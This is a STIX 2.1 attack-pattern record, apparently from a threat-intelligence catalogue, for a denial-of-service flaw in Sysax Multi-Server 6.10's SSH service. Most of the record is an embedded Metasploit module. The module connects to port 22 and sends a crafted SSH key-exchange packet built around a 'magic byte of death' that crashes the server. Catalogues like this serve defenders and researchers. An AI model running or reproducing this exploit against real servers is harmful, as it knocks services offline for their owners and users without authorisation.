{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--82977952-105b-40e6-932e-3aaa3526a827",
    "created": "2024-08-14T16:25:14.613336Z",
    "modified": "2024-08-14T16:25:14.613339Z",
    "name": "Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service",
    "description": " This module sends a specially-crafted SSH Key Exchange causing the service to crash. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/ssh/sysax_sshd_kexchange.rb",
            "external_id": "sysax_sshd_kexchange.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.mattandreko.com/2013/04/sysax-multi-server-610-ssh-dos.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service',\n      'Description'    => %q{\n          This module sends a specially-crafted SSH Key Exchange causing the service to\n        crash.\n      },\n      'Author'         => 'Matt \"hostess\" Andreko <mandreko[at]accuvant.com>',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '92081'],\n          [ 'URL', 'https://www.mattandreko.com/2013/04/sysax-multi-server-610-ssh-dos.html']\n        ],\n      'DisclosureDate' => '2013-03-17'))\n\n    register_options(\n      [\n        Opt::RPORT(22),\n        OptString.new('CLIENTVERSION', [ true, 'The SSH client version to report.', 'Debian-5ubuntu1'])\n      ])\n\n  end\n\n  def get_packet\n\n    delimiter = \"\\x00\"*3\n    packet = [0x00, 0x00, 0x03, 0x14, 0x08, 0x14, 0xff, 0x9f,\n              0xde, 0x5d, 0x5f, 0xb3, 0x07, 0x8f, 0x49, 0xa7,\n              0x79, 0x6a, 0x03, 0x3d, 0xaf, 0x55, 0x00, 0x00,\n              0x00, 0x7e].pack(\"C*\")\n    packet << Rex::Text.rand_text_alphanumeric(126)\n    packet << delimiter\n    packet << Rex::Text.rand_text_alphanumeric(16)\n    packet << delimiter\n    packet << Rex::Text.rand_text_alphanumeric(158)\n    packet << delimiter\n    packet << Rex::Text.rand_text_alphanumeric(158)\n    packet << delimiter\n    packet << Rex::Text.rand_text_alphanumeric(106)\n    packet << delimiter\n    packet << Rex::Text.rand_text_alphanumeric(106)\n    packet << delimiter\n    packet << \"\\x28\" # Magic byte of death - seems to work with just about\n            # anything except \\x1a, the value it's supposed to be\n    packet << Rex::Text.rand_text_alphanumeric(26)\n    packet << delimiter\n    packet << Rex::Text.rand_text_alphanumeric(27)\n    packet << delimiter*7\n  end\n\n  def run\n\n    connect\n\n    banner = sock.get_once || ''\n    print_status(\"Banner: #{banner.strip}\")\n    sock.put(\"SSH-2.0-OpenSSH_5.1p1 \" + datastore['CLIENTVERSION'] + \"\\r\\n\" + get_packet())\n\n    # Sometimes the socket closes faster than it can read, sometimes it doesn't, so catch the error just in case.\n    begin\n      sock.get_once\n    rescue Errno::ECONNRESET\n    end\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-17"
}